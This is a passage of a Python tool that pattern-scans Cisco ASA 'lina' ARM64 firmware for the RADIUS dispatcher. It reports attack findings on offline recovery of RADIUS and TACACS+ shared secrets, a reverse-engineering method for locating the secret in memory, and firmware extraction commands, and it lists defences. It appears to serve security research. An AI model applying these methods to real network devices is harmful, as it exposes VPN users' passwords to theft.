        in packet) takes values {1,2,3,11} — all non-zero, so CBZ is NOT used.

        Pattern to find:
          1. Load a byte: LDRB Wn, [Xm]        ; Code byte
          2. CMP  Wn, #1  ; Access-Request
          3. B.EQ <handler>
          4. CMP  Wn, #2  ; Access-Accept
          5. B.EQ <handler>
          ...

        Returns dict with candidate offsets and string anchor hits.
        """
        anchors = {}
        for name, pattern in LINA_STRING_ANCHORS.items():
            off = data.find(pattern)
            if off >= 0:
                anchors[name] = hex(off)

        # ARM64: CMP Wn, #imm  encoding = 0x7100001F | (imm << 10) | (Rn << 5)
        # B.EQ encoding: 0x54000000 | (offset19 << 5)
        # Look for CMP Wn, #1 followed within 8 bytes by B.EQ
        cmp1_pattern_word = 0x7100041F  # CMP Wn, #1 where n varies — mask needed
        dispatch_candidates = []
        for i in range(0, len(data) - 16, 4):
            word = struct.unpack_from('<I', data, i)[0]
            # CMP Wn, #1: encoding 0x7100 04xx where xx = Wn (bits 4:0)
            if (word & 0xFFFFFFE0) == 0x71000400:
                next_word = struct.unpack_from('<I', data, i + 4)[0]
                # B.EQ: top 24 bits = 0x54xxxxxx (bits [31:24] = 0x54, bit[0]=0)
                if (next_word >> 24) == 0x54 and (next_word & 1) == 0:
                    dispatch_candidates.append(hex(i))

        return {
            'string_anchors_found': anchors,
            'dispatch_candidates_cmp1_beq': dispatch_candidates[:20],
            'note': (
                'Candidates = addresses of CMP Wn,#1 / B.EQ pairs. '
                'Cross with ADRP+ADD xrefs to Access-Accept string to confirm dispatcher.'
            ),
            'prologue_count': len(self.scan_arm64_prologue_offsets(data)),
        }

    def run(self) -> list[dict]:
        if self.binary_path:
            return self.analyze_binary()

        # No binary: emit methodology and known attack surface
        self._finding('LINA_RE_METHODOLOGY', 'INFO',
            'Cisco ASA lina ARM64 RE methodology',
            'No binary supplied. The following documents the static analysis approach for the '
            'RADIUS/TACACS+ attack surface in the lina process.',
            {
                'arm64_calling_convention': ARM64_REGS,
                'string_anchors':           list(LINA_STRING_ANCHORS.keys()),
                'radius_functions':         list(LINA_RADIUS_FUNCTIONS.keys()),
                'static_analysis_steps':    list(STATIC_ANALYSIS_METHODOLOGY.keys()),
                'aaa_state_machine':        LINA_AAA_STATE_MACHINE['arm64_branch_table_pattern'],
            })

        self._finding('RADIUS_PASSWORD_XOR_ORACLE', 'HIGH',
            'RADIUS User-Password offline brute-force',
            'RFC 2865 §5.2: User-Password = plaintext XOR MD5(shared_secret + authenticator). '
            'A captured Access-Request + known password → offline PSK recovery. '
            'With PSK: decrypt any Access-Request on the wire to recover VPN user passwords.',
            {
                'attack_class':   'offline-brute-force',
                'requires':       'captured RADIUS Access-Request + known test password',
                'defense':        'RadSec (TLS over RADIUS, RFC 6614); rotate shared secrets; use EAP-TLS',
                'function':       'radius_crack_shared_secret()',
            })

        self._finding('TACACS_BODY_ORACLE', 'HIGH',
            'TACACS+ body decryption via known-plaintext',
            'TACACS+ body encrypted with MD5 chain keyed on shared key + session_id. '
            'First authen_start packet has partially predictable plaintext '
            '(authen_type=0x01, priv_lvl=0x00, authen_method=0x06, service=0x01). '
            'Offline brute-force of TACACS+ key from captured packet.',
            {
                'known_plaintext_offset': TACACS_BODY_START_FIELDS,
                'function': 'verify_tacacs_decrypt()',
            })

        self._finding('LINA_ARM64_RE_APPROACH', 'INFO',
            'Recommended static RE approach for stripped lina binary',
            'Ghidra + ARM64 calling convention awareness. '
            'Start from string xrefs to AAA anchor strings → walk call graph backward. '
            'All function args in X0-X7; struct fields accessed as LDR/STR [Xn, #offset]. '
            'Shared secret in aaa_server_t.secret at fixed struct offset — find via MD5 call graph.',
            {
                'methodology': STATIC_ANALYSIS_METHODOLOGY,
                'binary_targets': self.TARGETS,
                'firmware_extraction': (
                    'binwalk -e asa*.bin  →  find . -name lina -type f  →  '
                    'file lina  →  objdump -d lina'
                ),
            })

        return self._findings


if __name__ == '__main__':
    import json, sys
    binary = sys.argv[1] if len(sys.argv) > 1 else None
    findings = CiscoASALinaRE(binary_path=binary).run()
    for f in findings:
        print(f"[{f['severity']}] {f['id']}: {f['title']}")
        print(f"  {f['detail'][:120]}")
        if f.get('evidence'):
            first_key = next(iter(f['evidence']))
            print(f"  → {first_key}: {str(f['evidence'][first_key])[:80]}")
        print()
